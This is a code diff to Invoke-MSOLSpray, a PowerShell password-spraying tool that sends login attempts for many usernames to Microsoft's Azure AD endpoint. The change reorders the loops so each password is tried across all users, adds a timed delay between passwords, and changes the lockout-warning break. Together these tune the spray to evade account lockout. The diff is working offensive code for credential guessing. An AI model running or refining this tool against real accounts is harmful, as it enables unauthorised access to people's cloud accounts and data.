@@ -263,15 +263,23 @@ function Invoke-MSOLSpray {
             $Usernames = $Usernames | Sort-Object -Unique
             $Passwords = $Passwords | Sort-Object -Unique
         }
-        $UserProgressBarStartTime = Get-Date; $UserProgressBar = 0
-        :Userloop ForEach ($Username in $Usernames) {
-            $UserProgressBar = Write-MyProgressBar -StartTime $UserProgressBarStartTime -ObjectToCalculate $Usernames -Count $UserProgressBar -Activity "Testing users" -NestedDepth 1 -TaskPrefixText "User" -Task "Spraying password against user $($username)" -AddPauses
-            $PasswordProgressBarStartTime = Get-Date; $PasswordProgressBar = 0
-            ForEach ($Password in $Passwords) {
-                $PasswordProgressBar = Write-MyProgressBar -StartTime $PasswordProgressBarStartTime -ObjectToCalculate $Passwords -Count $PasswordProgressBar -Activity "Testing Passwords" -NestedDepth 2 -id 2 -parentid 1 -TaskPrefixText "Password" -Task "Spraying password $($Password)" -AddPauses
-                If ($Delay -gt 0) {
-                    Start-Sleep -Seconds $Delay
-                }
+		
+		$PasswordProgressBarStartTime = Get-Date; $PasswordProgressBar = 0
+		:PasswordLoop ForEach ($Password in $Passwords) {
+			$PasswordProgressBar = Write-MyProgressBar -StartTime $PasswordProgressBarStartTime -ObjectToCalculate $Passwords -Count $PasswordProgressBar -Activity "Testing Passwords" -NestedDepth 1 -TaskPrefixText "Password" -Task "Spraying password $($Password)" -AddPauses
+			
+			If ($Delay -gt 0 -And $Password -ne $Passwords[0]) {
+				$SleepProgressBar = 0
+				1..$Delay | ForEach-Object {
+					$SleepProgressBar = Write-MyProgressBar -Activity "$($Delay - $_) seconds remaining..." -NestedDepth 2 -id 2 -parentid 1 -ManualTotalSteps $Delay -Count $_ -TaskPrefixText "Sleeping" -Task "Sleeping for $($Delay) seconds" -StepPercentage
+					Start-Sleep -Seconds 1
+				}
+			}
+			
+			$UserProgressBarStartTime = Get-Date; $UserProgressBar = 0
+			:Userloop ForEach ($Username in $Usernames) {
+				$UserProgressBar = Write-MyProgressBar -StartTime $UserProgressBarStartTime -ObjectToCalculate $Usernames -Count $UserProgressBar -Activity "Testing users" -NestedDepth 2 -id 2 -parentid 1 -TaskPrefixText "User" -Task "Spraying password against user $($username)" -AddPauses
+				
                 $LogonRequest = $null     
                 $ErrorObject = $null
                 $BodyParams = @{'resource' = 'https://graph.windows.net'; 
@@ -314,7 +322,8 @@ function Invoke-MSOLSpray {
                 If (!$Force -and $lockout_count -eq $lockout_threshold) {
                     Write-Verbose "If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying"
                     If ($(Get-InvokeMSOLYesOrNo -Title "WARNING! Multiple Account Lockouts Detected!" -Question "10 of the accounts you sprayed appear to be locked out. If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled. Do you want to continue this spray?")) {
-                        Break :Userloop
+                        #Break :Userloop
+						Break :PasswordLoop
                     }
                 }
             }
